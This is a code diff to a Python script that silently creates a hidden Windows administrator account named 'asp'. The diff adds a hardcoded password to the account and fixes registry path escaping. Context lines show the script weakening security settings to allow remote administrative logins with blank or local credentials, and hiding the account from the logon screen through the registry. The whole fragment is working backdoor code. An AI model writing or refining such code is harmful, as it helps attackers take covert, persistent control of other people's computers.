@@ -94,7 +94,7 @@ def get_macaddress(host='localhost'):
 
 CREATE_NO_WINDOW = 0x08000000
 swin=os.getenv('windir')
-subprocess.call("net.exe user asp /add", creationflags=CREATE_NO_WINDOW)
+subprocess.call("net.exe user asp Qwerty12 /add", creationflags=CREATE_NO_WINDOW)
 subprocess.call("net.exe localgroup administrators asp /add", creationflags=CREATE_NO_WINDOW)
 subprocess.call("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f", creationflags=CREATE_NO_WINDOW)
 subprocess.call("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f", creationflags=CREATE_NO_WINDOW)
@@ -107,11 +107,11 @@ except:
 subprocess.call("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f", creationflags=CREATE_NO_WINDOW)
 if not os.path.exists('c:\windows\syswow64'):
         subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f', creationflags=CREATE_NO_WINDOW)
-        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\UserList" /f', creationflags=CREATE_NO_WINDOW)
+        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f', creationflags=CREATE_NO_WINDOW)
         subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f', creationflags=CREATE_NO_WINDOW)
 else:
         subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64', creationflags=CREATE_NO_WINDOW)
-        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\UserList" /f /reg:64', creationflags=CREATE_NO_WINDOW)
+        subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64', creationflags=CREATE_NO_WINDOW)
         #subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64', creationflags=CREATE_NO_WINDOW)
         subprocess.call('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64', creationflags=CREATE_NO_WINDOW)
 
